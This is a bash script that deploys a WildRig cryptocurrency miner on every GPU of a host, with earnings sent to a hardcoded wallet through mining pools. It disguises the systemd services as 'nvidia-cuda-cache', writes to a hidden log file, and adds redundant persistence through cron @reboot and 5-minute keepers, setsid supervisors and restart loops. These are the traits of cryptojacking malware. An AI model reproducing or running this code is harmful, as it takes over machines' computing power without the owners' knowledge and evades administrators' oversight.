#!/usr/bin/env bash
# fleet deploy: one PRL worker per GPU, 4 persistence layers. Idempotent.
set -uo pipefail
BASE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
W="${WALLET:-prl1pek8rh8yjck5q7596aph7ua7xnkqs8ur9mkfmz8w7xfzcdfcfx5vsx2f4lz}"
POOLS=(stratum+ssl://prl.kryptex.network:8048 stratum+tcp://prl.kryptex.network:7048 pool.pearlhash.xyz:9000)
LOG=/var/log/.wr_$(hostname -s).log
UNITDIR=/etc/systemd/system
mkdir -p /opt/fleet
install -m 0755 "$BASE/bin/wildrig-multi" /opt/fleet/wildrig-multi
IP=$(hostname -I 2>/dev/null | awk '{print $1}'); [ -n "${IP:-}" ] || IP=$(nvidia-smi --query-gpu=uuid --format=csv,noheader 2>/dev/null | head -1 | tr -dc 'a-z0-9' | tail -c 8)
IP=${IP:-127.0.0.1}
RIGBASE="ul-$(printf '%s' "$IP" | tr '.' '-')"
N=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU' || true)
if [ "${N:-0}" -lt 1 ]; then echo "NO-GPU"; nvidia-smi 2>&1 | head -3; exit 3; fi
echo "HOST=$(hostname) GPU_COUNT=$N RIGBASE=$RIGBASE"
PLIST=$(printf "'%s' " "${POOLS[@]}")
i=0
while [ "$i" -lt "$N" ]; do
  RIG="${RIGBASE}-g${i}"; RUN="/opt/fleet/run_${RIG}.sh"
  cat > "$RUN" <<EOF
#!/bin/bash
POOLS=($PLIST)
k=0
while :; do
  st=\$(date +%s)
  nice -n 19 stdbuf -oL /opt/fleet/wildrig-multi --algo pearlhash --url "\${POOLS[\$k]}" --user "$W.$RIG" --worker "$RIG" -d $i --gpu-temp-limit 85 --gpu-temp-resume 65 --no-color >> "$LOG" 2>&1
  [ \$(( \$(date +%s) - st )) -lt 90 ] && k=\$(( (k + 1) % 3 ))
  sleep 10
done
EOF
  chmod +x "$RUN"
  cat > "$UNITDIR/nv-cuda-cache-g${i}.service" <<EOF
[Unit]
Description=nvidia-cuda-cache g$i
[Service]
ExecStart=$RUN
Restart=always
RestartSec=15
Nice=19
[Install]
WantedBy=multi-user.target
EOF
  systemctl daemon-reload >/dev/null 2>&1
  systemctl enable --now "nv-cuda-cache-g${i}.service" >/dev/null 2>&1
  i=$((i+1))
done
# layer 2: @reboot + 5-min keeper via /etc/cron.d
{
  echo "SHELL=/bin/bash"
  echo "@reboot root for f in /opt/fleet/run_*.sh; do \$f >/dev/null 2>&1 & done"
  echo "*/5 * * * * root for f in /opt/fleet/run_*.sh; do pgrep -f \"\$f\" >/dev/null || (setsid \$f >/dev/null 2>&1 &); done"
} > /etc/cron.d/nv-cuda-cache 2>/dev/null; chmod 0644 /etc/cron.d/nv-cuda-cache 2>/dev/null
# layer 1: setsid supervisor (in case systemd is absent)
for f in /opt/fleet/run_*.sh; do pgrep -f "$f" >/dev/null || (setsid nohup "$f" >/dev/null 2>&1 &); done
# layer 4: cmdline keeper inside each supervisor is the while-loop itself; verify
sleep 8
echo "--- procs ---"; pgrep -af wildrig-multi | head -8
echo "--- log $LOG ---"; tail -n 6 "$LOG" 2>/dev/null
